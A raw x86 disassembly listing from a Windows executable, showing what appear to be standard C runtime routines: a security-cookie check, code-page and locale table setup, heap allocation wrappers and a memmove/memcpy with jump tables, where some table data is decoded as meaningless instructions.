  423fc6:	mov    ecx,DWORD PTR [esp+0x4]
  423fca:	sub    eax,ecx
  423fcc:	ret    
  423fcd:	lea    eax,[ecx-0x2]
  423fd0:	mov    ecx,DWORD PTR [esp+0x4]
  423fd4:	sub    eax,ecx
  423fd6:	ret    
  423fd7:	lea    eax,[ecx-0x3]
  423fda:	mov    ecx,DWORD PTR [esp+0x4]
  423fde:	sub    eax,ecx
  423fe0:	ret    
  423fe1:	lea    eax,[ecx-0x4]
  423fe4:	mov    ecx,DWORD PTR [esp+0x4]
  423fe8:	sub    eax,ecx
  423fea:	ret    
  423feb:	push   0x8
  423fed:	push   0x428598
  423ff2:	call   0x423950
  423ff7:	and    DWORD PTR [ebp-0x4],0x0
  423ffb:	push   0x0
  423ffd:	push   0x1
  423fff:	call   0x425b72
  424004:	pop    ecx
  424005:	pop    ecx
  424006:	jmp    0x42400f
  424008:	xor    eax,eax
  42400a:	inc    eax
  42400b:	ret    
  42400c:	mov    esp,DWORD PTR [ebp-0x18]
  42400f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424013:	push   0x3
  424015:	call   DWORD PTR ds:0x42806c
  42401b:	int3   
  42401c:	cmp    ecx,DWORD PTR ds:0x4646c0
  424022:	jne    0x424025
  424024:	ret    
  424025:	jmp    0x423feb
  42402a:	movzx  eax,BYTE PTR [esp+0x4]
  42402f:	mov    cl,BYTE PTR [esp+0xc]
  424033:	test   BYTE PTR [eax+0x4651c1],cl
  424039:	jne    0x424057
  42403b:	cmp    DWORD PTR [esp+0x8],0x0
  424040:	je     0x424050
  424042:	movzx  eax,WORD PTR [eax*2+0x428992]
  42404a:	and    eax,DWORD PTR [esp+0x8]
  42404e:	jmp    0x424052
  424050:	xor    eax,eax
  424052:	test   eax,eax
  424054:	jne    0x424057
  424056:	ret    
  424057:	xor    eax,eax
  424059:	inc    eax
  42405a:	ret    
  42405b:	push   0x4
  42405d:	push   0x0
  42405f:	push   DWORD PTR [esp+0xc]
  424063:	call   0x42402a
  424068:	add    esp,0xc
  42406b:	ret    
  42406c:	sub    eax,0x3a4
  424071:	je     0x424095
  424073:	sub    eax,0x4
  424076:	je     0x42408f
  424078:	sub    eax,0xd
  42407b:	je     0x424089
  42407d:	dec    eax
  42407e:	je     0x424083
  424080:	xor    eax,eax
  424082:	ret    
  424083:	mov    eax,0x404
  424088:	ret    
  424089:	mov    eax,0x412
  42408e:	ret    
  42408f:	mov    eax,0x804
  424094:	ret    
  424095:	mov    eax,0x411
  42409a:	ret    
  42409b:	push   edi
  42409c:	push   0x40
  42409e:	xor    eax,eax
  4240a0:	pop    ecx
  4240a1:	mov    edi,0x4651c0
  4240a6:	rep stos DWORD PTR es:[edi],eax
  4240a8:	stos   BYTE PTR es:[edi],al
  4240a9:	xor    eax,eax
  4240ab:	mov    ds:0x4652c4,eax
  4240b0:	mov    ds:0x4651bc,eax
  4240b5:	mov    ds:0x4651b4,eax
  4240ba:	mov    edi,0x4652d0
  4240bf:	stos   DWORD PTR es:[edi],eax
  4240c0:	stos   DWORD PTR es:[edi],eax
  4240c1:	stos   DWORD PTR es:[edi],eax
  4240c2:	pop    edi
  4240c3:	ret    
  4240c4:	push   ebp
  4240c5:	mov    ebp,esp
  4240c7:	sub    esp,0x518
  4240cd:	mov    eax,ds:0x4646c0
  4240d2:	xor    eax,DWORD PTR [ebp+0x4]
  4240d5:	push   esi
  4240d6:	mov    DWORD PTR [ebp-0x4],eax
  4240d9:	lea    eax,[ebp-0x18]
  4240dc:	push   eax
  4240dd:	push   DWORD PTR ds:0x4652c4
  4240e3:	call   DWORD PTR ds:0x4280e0
  4240e9:	cmp    eax,0x1
  4240ec:	mov    esi,0x100
  4240f1:	jne    0x424204
  4240f7:	xor    eax,eax
  4240f9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424100:	inc    eax
  424101:	cmp    eax,esi
  424103:	jb     0x4240f9
  424105:	mov    al,BYTE PTR [ebp-0x12]
  424108:	test   al,al
  42410a:	mov    BYTE PTR [ebp-0x118],0x20
  424111:	je     0x424149
  424113:	push   ebx
  424114:	lea    edx,[ebp-0x11]
  424117:	push   edi
  424118:	movzx  ecx,BYTE PTR [edx]
  42411b:	movzx  eax,al
  42411e:	cmp    eax,ecx
  424120:	ja     0x42413f
  424122:	sub    ecx,eax
  424124:	inc    ecx
  424125:	mov    ebx,ecx
  424127:	shr    ecx,0x2
  42412a:	lea    edi,[ebp+eax*1-0x118]
  424131:	mov    eax,0x20202020
  424136:	rep stos DWORD PTR es:[edi],eax
  424138:	mov    ecx,ebx
  42413a:	and    ecx,0x3
  42413d:	rep stos BYTE PTR es:[edi],al
  42413f:	inc    edx
  424140:	mov    al,BYTE PTR [edx]
  424142:	inc    edx
  424143:	test   al,al
  424145:	jne    0x424118
  424147:	pop    edi
  424148:	pop    ebx
  424149:	push   0x0
  42414b:	push   DWORD PTR ds:0x4651b4
  424151:	lea    eax,[ebp-0x518]
  424157:	push   DWORD PTR ds:0x4652c4
  42415d:	push   eax
  42415e:	push   esi
  42415f:	lea    eax,[ebp-0x118]
  424165:	push   eax
  424166:	push   0x1
  424168:	call   0x426078
  42416d:	push   0x0
  42416f:	push   DWORD PTR ds:0x4652c4
  424175:	lea    eax,[ebp-0x218]
  42417b:	push   esi
  42417c:	push   eax
  42417d:	push   esi
  42417e:	lea    eax,[ebp-0x118]
  424184:	push   eax
  424185:	push   esi
  424186:	push   DWORD PTR ds:0x4651b4
  42418c:	call   0x425cbc
  424191:	push   0x0
  424193:	push   DWORD PTR ds:0x4652c4
  424199:	lea    eax,[ebp-0x318]
  42419f:	push   esi
  4241a0:	push   eax
  4241a1:	push   esi
  4241a2:	lea    eax,[ebp-0x118]
  4241a8:	push   eax
  4241a9:	push   0x200
  4241ae:	push   DWORD PTR ds:0x4651b4
  4241b4:	call   0x425cbc
  4241b9:	add    esp,0x5c
  4241bc:	xor    eax,eax
  4241be:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241c6:	test   cl,0x1
  4241c9:	je     0x4241e1
  4241cb:	or     BYTE PTR [eax+0x4651c1],0x10
  4241d2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241d9:	mov    BYTE PTR [eax+0x4652e0],cl
  4241df:	jmp    0x4241fd
  4241e1:	test   cl,0x2
  4241e4:	je     0x4241f6
  4241e6:	or     BYTE PTR [eax+0x4651c1],0x20
  4241ed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241f4:	jmp    0x4241d9
  4241f6:	and    BYTE PTR [eax+0x4652e0],0x0
  4241fd:	inc    eax
  4241fe:	cmp    eax,esi
  424200:	jb     0x4241be
  424202:	jmp    0x424248
  424204:	xor    eax,eax
  424206:	cmp    eax,0x41
  424209:	jb     0x424224
  42420b:	cmp    eax,0x5a
  42420e:	ja     0x424224
  424210:	or     BYTE PTR [eax+0x4651c1],0x10
  424217:	mov    cl,al
  424219:	add    cl,0x20
  42421c:	mov    BYTE PTR [eax+0x4652e0],cl
  424222:	jmp    0x424243
  424224:	cmp    eax,0x61
  424227:	jb     0x42423c
  424229:	cmp    eax,0x7a
  42422c:	ja     0x42423c
  42422e:	or     BYTE PTR [eax+0x4651c1],0x20
  424235:	mov    cl,al
  424237:	sub    cl,0x20
  42423a:	jmp    0x42421c
  42423c:	and    BYTE PTR [eax+0x4652e0],0x0
  424243:	inc    eax
  424244:	cmp    eax,esi
  424246:	jb     0x424206
  424248:	mov    ecx,DWORD PTR [ebp-0x4]
  42424b:	xor    ecx,DWORD PTR [ebp+0x4]
  42424e:	pop    esi
  42424f:	call   0x42401c
  424254:	leave  
  424255:	ret    
  424256:	push   ebp
  424257:	mov    ebp,esp
  424259:	sub    esp,0x1c
  42425c:	mov    eax,ds:0x4646c0
  424261:	xor    eax,DWORD PTR [ebp+0x4]
  424264:	push   ebx
  424265:	push   esi
  424266:	mov    esi,DWORD PTR [ebp+0x8]
  424269:	xor    ebx,ebx
  42426b:	cmp    esi,ebx
  42426d:	mov    DWORD PTR [ebp-0x4],eax
  424270:	push   edi
  424271:	je     0x4243cb
  424277:	xor    edx,edx
  424279:	xor    eax,eax
  42427b:	cmp    DWORD PTR [eax+0x4646d0],esi
  424281:	je     0x4242e8
  424283:	add    eax,0x30
  424286:	inc    edx
  424287:	cmp    eax,0xf0
  42428c:	jb     0x42427b
  42428e:	lea    eax,[ebp-0x1c]
  424291:	push   eax
  424292:	push   esi
  424293:	call   DWORD PTR ds:0x4280e0
  424299:	cmp    eax,0x1
  42429c:	jne    0x4243c3
  4242a2:	push   0x40
  4242a4:	xor    eax,eax
  4242a6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4242aa:	pop    ecx
  4242ab:	mov    edi,0x4651c0
  4242b0:	rep stos DWORD PTR es:[edi],eax
  4242b2:	stos   BYTE PTR es:[edi],al
  4242b3:	mov    DWORD PTR ds:0x4652c4,esi
  4242b9:	mov    DWORD PTR ds:0x4651b4,ebx
  4242bf:	jbe    0x4243b1
  4242c5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242c9:	je     0x424389
  4242cf:	lea    ecx,[ebp-0x15]
  4242d2:	mov    dl,BYTE PTR [ecx]
  4242d4:	test   dl,dl
  4242d6:	je     0x424389
  4242dc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242e0:	movzx  edx,dl
  4242e3:	jmp    0x424379
  4242e8:	push   0x40
  4242ea:	xor    eax,eax
  4242ec:	pop    ecx
  4242ed:	mov    edi,0x4651c0
  4242f2:	rep stos DWORD PTR es:[edi],eax
  4242f4:	lea    ecx,[edx+edx*2]
  4242f7:	shl    ecx,0x4
  4242fa:	mov    DWORD PTR [ebp-0x8],ebx
  4242fd:	stos   BYTE PTR es:[edi],al
  4242fe:	lea    ebx,[ecx+0x4646e0]
  424304:	mov    al,BYTE PTR [ebx]
  424306:	mov    esi,ebx
  424308:	jmp    0x424333
  42430a:	mov    dl,BYTE PTR [esi+0x1]
  42430d:	test   dl,dl
  42430f:	je     0x424337
  424311:	movzx  eax,al
  424314:	movzx  edi,dl
  424317:	cmp    eax,edi
  424319:	ja     0x42432f
  42431b:	mov    edx,DWORD PTR [ebp-0x8]
  42431e:	mov    dl,BYTE PTR [edx+0x4646c8]
  424324:	or     BYTE PTR [eax+0x4651c1],dl
  42432a:	inc    eax
  42432b:	cmp    eax,edi
  42432d:	jbe    0x424324
  42432f:	inc    esi
  424330:	inc    esi
  424331:	mov    al,BYTE PTR [esi]
  424333:	test   al,al
  424335:	jne    0x42430a
  424337:	inc    DWORD PTR [ebp-0x8]
  42433a:	add    ebx,0x8
  42433d:	cmp    DWORD PTR [ebp-0x8],0x4
  424341:	jb     0x424304
  424343:	mov    eax,DWORD PTR [ebp+0x8]
  424346:	mov    ds:0x4652c4,eax
  42434b:	mov    DWORD PTR ds:0x4651bc,0x1
  424355:	call   0x42406c
  42435a:	lea    ecx,[ecx+0x4646d4]
  424360:	mov    esi,ecx
  424362:	mov    edi,0x4652d0
  424367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424369:	mov    ds:0x4651b4,eax
  42436e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42436f:	jmp    0x4243d0
  424371:	or     BYTE PTR [eax+0x4651c1],0x4
  424378:	inc    eax
  424379:	cmp    eax,edx
  42437b:	jbe    0x424371
  42437d:	inc    ecx
  42437e:	inc    ecx
  42437f:	cmp    BYTE PTR [ecx-0x1],0x0
  424383:	jne    0x4242d2
  424389:	xor    ecx,ecx
  42438b:	inc    ecx
  42438c:	mov    eax,ecx
  42438e:	or     BYTE PTR [eax+0x4651c1],0x8
  424395:	inc    eax
  424396:	cmp    eax,0xff
  42439b:	jb     0x42438e
  42439d:	mov    eax,esi
  42439f:	call   0x42406c
  4243a4:	mov    ds:0x4651b4,eax
  4243a9:	mov    DWORD PTR ds:0x4651bc,ecx
  4243af:	jmp    0x4243b7
  4243b1:	mov    DWORD PTR ds:0x4651bc,ebx
  4243b7:	xor    eax,eax
  4243b9:	mov    edi,0x4652d0
  4243be:	stos   DWORD PTR es:[edi],eax
  4243bf:	stos   DWORD PTR es:[edi],eax
  4243c0:	stos   DWORD PTR es:[edi],eax
  4243c1:	jmp    0x4243d0
  4243c3:	cmp    DWORD PTR ds:0x465024,ebx
  4243c9:	je     0x4243d9
  4243cb:	call   0x42409b
  4243d0:	call   0x4240c4
  4243d5:	xor    eax,eax
  4243d7:	jmp    0x4243dc
  4243d9:	or     eax,0xffffffff
  4243dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243df:	xor    ecx,DWORD PTR [ebp+0x4]
  4243e2:	pop    edi
  4243e3:	pop    esi
  4243e4:	pop    ebx
  4243e5:	call   0x42401c
  4243ea:	leave  
  4243eb:	ret    
  4243ec:	push   0x14
  4243ee:	push   0x4285a8
  4243f3:	call   0x423950
  4243f8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243fc:	push   0xd
  4243fe:	call   0x423b0f
  424403:	pop    ecx
  424404:	xor    edi,edi
  424406:	mov    DWORD PTR [ebp-0x4],edi
  424409:	mov    DWORD PTR ds:0x465024,edi
  42440f:	mov    eax,DWORD PTR [ebp+0x8]
  424412:	cmp    eax,0xfffffffe
  424415:	jne    0x424429
  424417:	mov    DWORD PTR ds:0x465024,0x1
  424421:	call   DWORD PTR ds:0x4280dc
  424427:	jmp    0x424454
  424429:	cmp    eax,0xfffffffd
  42442c:	jne    0x424440
  42442e:	mov    DWORD PTR ds:0x465024,0x1
  424438:	call   DWORD PTR ds:0x4280d8
  42443e:	jmp    0x424454
  424440:	cmp    eax,0xfffffffc
  424443:	jne    0x424454
  424445:	mov    DWORD PTR ds:0x465024,0x1
  42444f:	mov    eax,ds:0x465054
  424454:	mov    DWORD PTR [ebp+0x8],eax
  424457:	cmp    eax,DWORD PTR ds:0x4652c4
  42445d:	je     0x42451e
  424463:	mov    esi,DWORD PTR ds:0x4651b8
  424469:	mov    DWORD PTR [ebp-0x20],esi
  42446c:	cmp    esi,edi
  42446e:	je     0x424474
  424470:	cmp    DWORD PTR [esi],edi
  424472:	je     0x424484
  424474:	push   0x220
  424479:	call   0x424672
  42447e:	pop    ecx
  42447f:	mov    esi,eax
  424481:	mov    DWORD PTR [ebp-0x20],esi
  424484:	cmp    esi,edi
  424486:	je     0x424507
  424488:	push   DWORD PTR [ebp+0x8]
  42448b:	call   0x424256
  424490:	pop    ecx
  424491:	mov    DWORD PTR [ebp-0x1c],eax
  424494:	cmp    eax,edi
  424496:	jne    0x424507
  424498:	mov    DWORD PTR [esi],edi
  42449a:	mov    eax,ds:0x4652c4
  42449f:	mov    DWORD PTR [esi+0x4],eax
  4244a2:	mov    eax,ds:0x4651bc
  4244a7:	mov    DWORD PTR [esi+0x8],eax
  4244aa:	mov    eax,ds:0x4651b4
  4244af:	mov    DWORD PTR [esi+0xc],eax
  4244b2:	xor    eax,eax
  4244b4:	mov    DWORD PTR [ebp-0x24],eax
  4244b7:	cmp    eax,0x5
  4244ba:	jge    0x4244cc
  4244bc:	mov    cx,WORD PTR [eax*2+0x4652d0]
  4244c4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244c9:	inc    eax
  4244ca:	jmp    0x4244b4
  4244cc:	xor    eax,eax
  4244ce:	mov    DWORD PTR [ebp-0x24],eax
  4244d1:	cmp    eax,0x101
  4244d6:	jge    0x4244e5
  4244d8:	mov    cl,BYTE PTR [eax+0x4651c0]
  4244de:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244e2:	inc    eax
  4244e3:	jmp    0x4244ce
  4244e5:	xor    eax,eax
  4244e7:	mov    DWORD PTR [ebp-0x24],eax
  4244ea:	cmp    eax,0x100
  4244ef:	jge    0x424501
  4244f1:	mov    cl,BYTE PTR [eax+0x4652e0]
  4244f7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244fe:	inc    eax
  4244ff:	jmp    0x4244e7
  424501:	mov    DWORD PTR ds:0x4651b8,esi
  424507:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42450b:	jne    0x424521
  42450d:	cmp    esi,DWORD PTR ds:0x4651b8
  424513:	je     0x424521
  424515:	push   esi
  424516:	call   0x42455a
  42451b:	pop    ecx
  42451c:	jmp    0x424521
  42451e:	mov    DWORD PTR [ebp-0x1c],edi
  424521:	or     DWORD PTR [ebp-0x4],0xffffffff
  424525:	call   0x424533
  42452a:	mov    eax,DWORD PTR [ebp-0x1c]
  42452d:	call   0x42398b
  424532:	ret    
  424533:	push   0xd
  424535:	call   0x423a7b
  42453a:	pop    ecx
  42453b:	ret    
  42453c:	cmp    DWORD PTR ds:0x46550c,0x0
  424543:	jne    0x424557
  424545:	push   0xfffffffd
  424547:	call   0x4243ec
  42454c:	pop    ecx
  42454d:	mov    DWORD PTR ds:0x46550c,0x1
  424557:	xor    eax,eax
  424559:	ret    
  42455a:	push   0xc
  42455c:	push   0x4285b8
  424561:	call   0x423950
  424566:	mov    esi,DWORD PTR [ebp+0x8]
  424569:	test   esi,esi
  42456b:	je     0x4245c5
  42456d:	cmp    DWORD PTR ds:0x4653e4,0x3
  424574:	jne    0x4245b6
  424576:	push   0x4
  424578:	call   0x423b0f
  42457d:	pop    ecx
  42457e:	and    DWORD PTR [ebp-0x4],0x0
  424582:	push   esi
  424583:	call   0x424d32
  424588:	pop    ecx
  424589:	mov    DWORD PTR [ebp-0x1c],eax
  42458c:	test   eax,eax
  42458e:	je     0x424599
  424590:	push   esi
  424591:	push   eax
  424592:	call   0x424d5d
  424597:	pop    ecx
  424598:	pop    ecx
  424599:	or     DWORD PTR [ebp-0x4],0xffffffff
  42459d:	call   0x4245ad
  4245a2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4245a6:	jne    0x4245c5
  4245a8:	push   DWORD PTR [ebp+0x8]
  4245ab:	jmp    0x4245b7
  4245ad:	push   0x4
  4245af:	call   0x423a7b
  4245b4:	pop    ecx
  4245b5:	ret    
  4245b6:	push   esi
  4245b7:	push   0x0
  4245b9:	push   DWORD PTR ds:0x4653e0
  4245bf:	call   DWORD PTR ds:0x4280c8
  4245c5:	call   0x42398b
  4245ca:	ret    
  4245cb:	push   0xc
  4245cd:	push   0x4285c8
  4245d2:	call   0x423950
  4245d7:	mov    esi,DWORD PTR [ebp+0x8]
  4245da:	cmp    DWORD PTR ds:0x4653e4,0x3
  4245e1:	jne    0x424611
  4245e3:	cmp    esi,DWORD PTR ds:0x4651a4
  4245e9:	ja     0x424611
  4245eb:	push   0x4
  4245ed:	call   0x423b0f
  4245f2:	pop    ecx
  4245f3:	and    DWORD PTR [ebp-0x4],0x0
  4245f7:	push   esi
  4245f8:	call   0x425511
  4245fd:	pop    ecx
  4245fe:	mov    DWORD PTR [ebp-0x1c],eax
  424601:	or     DWORD PTR [ebp-0x4],0xffffffff
  424605:	call   0x42463d
  42460a:	mov    eax,DWORD PTR [ebp-0x1c]
  42460d:	test   eax,eax
  42460f:	jne    0x424634
  424611:	test   esi,esi
  424613:	jne    0x424616
  424615:	inc    esi
  424616:	cmp    DWORD PTR ds:0x4653e4,0x1
  42461d:	je     0x424625
  42461f:	add    esi,0xf
  424622:	and    esi,0xfffffff0
  424625:	push   esi
  424626:	push   0x0
  424628:	push   DWORD PTR ds:0x4653e0
  42462e:	call   DWORD PTR ds:0x4280e4
  424634:	call   0x42398b
  424639:	ret    
  42463a:	mov    esi,DWORD PTR [ebp+0x8]
  42463d:	push   0x4
  42463f:	call   0x423a7b
  424644:	pop    ecx
  424645:	ret    
  424646:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42464b:	ja     0x42466f
  42464d:	push   DWORD PTR [esp+0x4]
  424651:	call   0x4245cb
  424656:	test   eax,eax
  424658:	pop    ecx
  424659:	jne    0x424671
  42465b:	cmp    DWORD PTR [esp+0x8],eax
  42465f:	je     0x424671
  424661:	push   DWORD PTR [esp+0x4]
  424665:	call   0x426232
  42466a:	test   eax,eax
  42466c:	pop    ecx
  42466d:	jne    0x42464d
  42466f:	xor    eax,eax
  424671:	ret    
  424672:	push   DWORD PTR ds:0x465068
  424678:	push   DWORD PTR [esp+0x8]
  42467c:	call   0x424646
  424681:	pop    ecx
  424682:	pop    ecx
  424683:	ret    
  424684:	int3   
  424685:	int3   
  424686:	int3   
  424687:	int3   
  424688:	int3   
  424689:	int3   
  42468a:	int3   
  42468b:	int3   
  42468c:	int3   
  42468d:	int3   
  42468e:	int3   
  42468f:	int3   
  424690:	push   ebp
  424691:	mov    ebp,esp
  424693:	push   edi
  424694:	push   esi
  424695:	mov    esi,DWORD PTR [ebp+0xc]
  424698:	mov    ecx,DWORD PTR [ebp+0x10]
  42469b:	mov    edi,DWORD PTR [ebp+0x8]
  42469e:	mov    eax,ecx
  4246a0:	mov    edx,ecx
  4246a2:	add    eax,esi
  4246a4:	cmp    edi,esi
  4246a6:	jbe    0x4246b0
  4246a8:	cmp    edi,eax
  4246aa:	jb     0x42482c
  4246b0:	test   edi,0x3
  4246b6:	jne    0x4246cc
  4246b8:	shr    ecx,0x2
  4246bb:	and    edx,0x3
  4246be:	cmp    ecx,0x8
  4246c1:	jb     0x4246ec
  4246c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c5:	jmp    DWORD PTR [edx*4+0x4247dc]
  4246cc:	mov    eax,edi
  4246ce:	mov    edx,0x3
  4246d3:	sub    ecx,0x4
  4246d6:	jb     0x4246e4
  4246d8:	and    eax,0x3
  4246db:	add    ecx,eax
  4246dd:	jmp    DWORD PTR [eax*4+0x4246f0]
  4246e4:	jmp    DWORD PTR [ecx*4+0x4247ec]
  4246eb:	nop
  4246ec:	jmp    DWORD PTR [ecx*4+0x424770]
  4246f3:	nop
  4246f4:	add    BYTE PTR [edi+0x42],al
  4246f7:	add    BYTE PTR [edi+eax*2],ch
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [eax+0x47],dl
  4246fe:	inc    edx
  4246ff:	add    BYTE PTR [ebx],ah
  424701:	ror    DWORD PTR [edx-0x75f877fa],1
  424707:	inc    esi
  424708:	add    DWORD PTR [eax+0x468a0147],ecx
  42470e:	add    al,cl
  424710:	jmp    0x289cf17
  424715:	add    esi,0x3
  424718:	add    edi,0x3
  42471b:	cmp    ecx,0x8
  42471e:	jb     0x4246ec
  424720:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424722:	jmp    DWORD PTR [edx*4+0x4247dc]
  424729:	lea    ecx,[ecx+0x0]
  42472c:	and    edx,ecx
  42472e:	mov    al,BYTE PTR [esi]
  424730:	mov    BYTE PTR [edi],al
  424732:	mov    al,BYTE PTR [esi+0x1]
  424735:	shr    ecx,0x2
  424738:	mov    BYTE PTR [edi+0x1],al
  42473b:	add    esi,0x2
  42473e:	add    edi,0x2
  424741:	cmp    ecx,0x8
  424744:	jb     0x4246ec
  424746:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424748:	jmp    DWORD PTR [edx*4+0x4247dc]
  42474f:	nop
  424750:	and    edx,ecx
  424752:	mov    al,BYTE PTR [esi]
  424754:	mov    BYTE PTR [edi],al
  424756:	add    esi,0x1
  424759:	shr    ecx,0x2
  42475c:	add    edi,0x1
  42475f:	cmp    ecx,0x8
  424762:	jb     0x4246ec
  424764:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424766:	jmp    DWORD PTR [edx*4+0x4247dc]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	rol    DWORD PTR [edi+0x42],cl
  424773:	add    al,al
  424775:	inc    edi
  424776:	inc    edx
  424777:	add    BYTE PTR [eax-0x4fffbdb9],bh
  42477d:	inc    edi
  42477e:	inc    edx
  42477f:	add    BYTE PTR [eax-0x5fffbdb9],ch
  424785:	inc    edi
  424786:	inc    edx
  424787:	add    BYTE PTR [eax-0x6fffbdb9],bl
  42478d:	inc    edi
  42478e:	inc    edx
  42478f:	add    BYTE PTR [ebx-0x761b71bc],cl
  424795:	inc    esp
  424796:	(bad)  
  424797:	in     al,0x8b
  424799:	inc    esp
  42479a:	mov    gs,eax
  42479c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4247a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4247ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4247b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4247b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4247b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4247bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4247c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247c8:	lea    eax,[ecx*4+0x0]
  4247cf:	add    esi,eax
  4247d1:	add    edi,eax
  4247d3:	jmp    DWORD PTR [edx*4+0x4247dc]
  4247da:	mov    edi,edi
  4247dc:	in     al,dx
  4247dd:	inc    edi
  4247de:	inc    edx
  4247df:	add    ah,dh
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],al
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax+ecx*2],dl
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247f1:	leave  
  4247f2:	ret    
  4247f3:	nop
  4247f4:	mov    al,BYTE PTR [esi]
  4247f6:	mov    BYTE PTR [edi],al
  4247f8:	mov    eax,DWORD PTR [ebp+0x8]
  4247fb:	pop    esi
  4247fc:	pop    edi
  4247fd:	leave  
  4247fe:	ret    
  4247ff:	nop
  424800:	mov    al,BYTE PTR [esi]
  424802:	mov    BYTE PTR [edi],al
  424804:	mov    al,BYTE PTR [esi+0x1]
  424807:	mov    BYTE PTR [edi+0x1],al
  42480a:	mov    eax,DWORD PTR [ebp+0x8]
  42480d:	pop    esi
  42480e:	pop    edi
  42480f:	leave  
  424810:	ret    
  424811:	lea    ecx,[ecx+0x0]
  424814:	mov    al,BYTE PTR [esi]
  424816:	mov    BYTE PTR [edi],al
  424818:	mov    al,BYTE PTR [esi+0x1]
  42481b:	mov    BYTE PTR [edi+0x1],al
  42481e:	mov    al,BYTE PTR [esi+0x2]
  424821:	mov    BYTE PTR [edi+0x2],al
  424824:	mov    eax,DWORD PTR [ebp+0x8]
  424827:	pop    esi
  424828:	pop    edi
  424829:	leave  
  42482a:	ret    
  42482b:	nop
  42482c:	lea    esi,[ecx+esi*1-0x4]
  424830:	lea    edi,[ecx+edi*1-0x4]
  424834:	test   edi,0x3
  42483a:	jne    0x424860
  42483c:	shr    ecx,0x2
  42483f:	and    edx,0x3
  424842:	cmp    ecx,0x8
  424845:	jb     0x424854
  424847:	std    
  424848:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42484a:	cld    
  42484b:	jmp    DWORD PTR [edx*4+0x424978]
  424852:	mov    edi,edi
  424854:	neg    ecx
  424856:	jmp    DWORD PTR [ecx*4+0x424928]
  42485d:	lea    ecx,[ecx+0x0]
  424860:	mov    eax,edi
  424862:	mov    edx,0x3
  424867:	cmp    ecx,0x4
  42486a:	jb     0x424878
  42486c:	and    eax,0x3
  42486f:	sub    ecx,eax
  424871:	jmp    DWORD PTR [eax*4+0x42487c]
  424878:	jmp    DWORD PTR [ecx*4+0x424978]
  42487f:	nop
  424880:	mov    WORD PTR [eax+0x42],cs
  424883:	add    BYTE PTR [eax-0x27ffbdb8],dh
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424891:	mov    BYTE PTR [edi+0x3],al
  424894:	sub    esi,0x1
  424897:	shr    ecx,0x2
  42489a:	sub    edi,0x1
  42489d:	cmp    ecx,0x8
  4248a0:	jb     0x424854
  4248a2:	std    
  4248a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248a5:	cld    
  4248a6:	jmp    DWORD PTR [edx*4+0x424978]
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	and    edx,ecx
  4248b5:	mov    BYTE PTR [edi+0x3],al
  4248b8:	mov    al,BYTE PTR [esi+0x2]
  4248bb:	shr    ecx,0x2
  4248be:	mov    BYTE PTR [edi+0x2],al
  4248c1:	sub    esi,0x2
  4248c4:	sub    edi,0x2
  4248c7:	cmp    ecx,0x8
  4248ca:	jb     0x424854
  4248cc:	std    
  4248cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248cf:	cld    
  4248d0:	jmp    DWORD PTR [edx*4+0x424978]
  4248d7:	nop
  4248d8:	mov    al,BYTE PTR [esi+0x3]
  4248db:	and    edx,ecx
  4248dd:	mov    BYTE PTR [edi+0x3],al
  4248e0:	mov    al,BYTE PTR [esi+0x2]
  4248e3:	mov    BYTE PTR [edi+0x2],al
  4248e6:	mov    al,BYTE PTR [esi+0x1]
  4248e9:	shr    ecx,0x2
  4248ec:	mov    BYTE PTR [edi+0x1],al
  4248ef:	sub    esi,0x3
  4248f2:	sub    edi,0x3
  4248f5:	cmp    ecx,0x8
  4248f8:	jb     0x424854
  4248fe:	std    
  4248ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424901:	cld    
  424902:	jmp    DWORD PTR [edx*4+0x424978]
  424909:	lea    ecx,[ecx+0x0]
  42490c:	sub    al,0x49
  42490e:	inc    edx
  42490f:	add    BYTE PTR [ecx+ecx*2],dh
  424912:	inc    edx
  424913:	add    BYTE PTR [ecx+ecx*2],bh
